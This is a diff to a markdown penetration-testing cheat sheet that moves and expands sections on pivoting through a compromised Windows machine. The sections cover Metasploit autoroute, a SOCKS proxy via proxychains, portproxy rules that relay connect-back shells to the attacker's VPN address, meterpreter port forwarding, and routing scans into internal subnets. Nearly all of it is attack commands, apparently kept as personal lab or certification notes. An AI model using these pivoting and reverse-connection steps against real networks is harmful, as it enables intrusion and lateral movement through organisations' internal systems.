@@ -796,8 +796,73 @@ meterpreter > run autoroute -s 172.30.111.0/24
 meterpreter > background
 msf exploit(psexec) > use auxiliary/scanner/portscan/tcp
 
+### USE THE EXPLOITED MACHINE AS A BRIDGE
+```bash
+use post/manage/autoroute
+route print
+use auxiliary/server/socks_proxy
+     Set our proxy SRVHOST value to be that of our VPN tunnel IP address, and run the module:
+
+sudo nano /etc/proxychains.conf
+(last line) socks4 127.0.0.1 1080
+proxychains iceweasel (for browser)
+
+Now turn on the proxy in the web browser config to the VPN Tunnel address with the correct socks 4a
+Browse like normal
+
+NOW TO GET THE MACHINE TO BE ABLE TO CONNECT BACK TO US
+
+modify the default RPORT option to be that of the TCP port 8443
+LHOST to be that of the pivot machine's external IP 172.16.80.100
+
+use post/windows/manage/portproxy
+msf post(windows/manage/portproxy) > set CONNECT_ADDRESS 175.12.80.21 (My VPN)
+msf post(windows/manage/portproxy) > set CONNECT_PORT 4444 (Whatever)
+msf post(windows/manage/portproxy) > set LOCAL_ADDRESS 10.100.11.101 (What machine I am using to pivot)
+msf post(windows/manage/portproxy) > set LOCAL_PORT 4444 (Whatever)
+msf post(windows/manage/portproxy) > set SESSION 1
+msf post(windows/manage/portproxy) > run
+
+NOW I AM ON THE SYSTEM BUT INORDER TO REACH BY TO KALI I NEED TO SET UP ANOTHER PORT PROXY RULE
+(All same but change the port and use the port for the attack)
+msf post(windows/manage/portproxy) > set CONNECT_ADDRESS 175.12.80.21 (My VPN)
+msf post(windows/manage/portproxy) > set CONNECT_PORT 4444 (Whatever)
+msf post(windows/manage/portproxy) > set LOCAL_ADDRESS 10.100.11.101 (What machine I am using to pivot)
+msf post(windows/manage/portproxy) > set LOCAL_PORT 4444 (Whatever)
+msf post(windows/manage/portproxy) > set SESSION 1
+msf post(windows/manage/portproxy) > run
+
+Now use that new port as the port and use the pivot box as the IP
+
+
+ADD PORT FORWARD RULE
+meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.200 (or whatever you want to get to)
+
+OR
+meterpreter > run autoroute -s 10.32.121.0/24
 ```
 
+### Machine cant reach back over internet
+```bash
+use post/windows/manage/autoroute
+set session 1
+set subnet 10.10.11.0
+run
+use post/windows/manage/autoroute
+set subnet 10.10.10.0
+run
+route print
+Active Routing Table
+====================
+
+ Subnet          Netmask          Gateway
+ ------          -------          -------
+ 10.10.10.0      255.255.255.0    Session 1
+ 10.10.11.0      255.255.255.0    Session 1
+
+Now change LHOST to vicim 1
+```
+```
 ##### RECON The Target NET
 ```bash
 ping sweep
@@ -935,60 +1000,7 @@ netstat -ano
 use /post/multi/gather/ping_sweep
 run arp_scanner -r 10.10.10.0/24
 ```
-### USE THE EXPLOITED MACHINE AS A BRIDGE
-```bash
-use post/manage/autoroute
-route print
-use auxiliary/server/socks_proxy
-     Set our proxy SRVHOST value to be that of our VPN tunnel IP address, and run the module:
 
-sudo nano /etc/proxychains.conf
-(last line) socks4 127.0.0.1 1080
-proxychains iceweasel (for browser)
-
-Now turn on the proxy in the web browser config to the VPN Tunnel address with the correct socks 4a
-Browse like normal
-
-NOW TO GET THE MACHINE TO BE ABLE TO CONNECT BACK TO US
-
-modify the default RPORT option to be that of the TCP port 8443
-LHOST to be that of the pivot machine's external IP 172.16.80.100
-
-use post/windows/manage/portproxy
-msf post(windows/manage/portproxy) > set CONNECT_ADDRESS 175.12.80.21 (My VPN)
-msf post(windows/manage/portproxy) > set CONNECT_PORT 4444 (Whatever)
-msf post(windows/manage/portproxy) > set LOCAL_ADDRESS 10.100.11.101 (What machine I am using to pivot)
-msf post(windows/manage/portproxy) > set LOCAL_PORT 4444 (Whatever)
-msf post(windows/manage/portproxy) > set SESSION 1
-msf post(windows/manage/portproxy) > run
-
-ADD PORT FORWARD RULE
-meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.200 (or whatever you want to get to)
-
-OR
-meterpreter > run autoroute -s 10.32.121.0/24
-```
-
-### Machine cant reach back over internet
-```bash
-use post/windows/manage/autoroute
-set session 1
-set subnet 10.10.11.0
-run
-use post/windows/manage/autoroute
-set subnet 10.10.10.0
-run
-route print
-Active Routing Table
-====================
-
- Subnet          Netmask          Gateway
- ------          -------          -------
- 10.10.10.0      255.255.255.0    Session 1
- 10.10.11.0      255.255.255.0    Session 1
-
-Now change LHOST to vicim 1
-```
 ##### Custom SSL Meterpreter
 ```bash
 use auxiliary/gather/impersonate_ssl
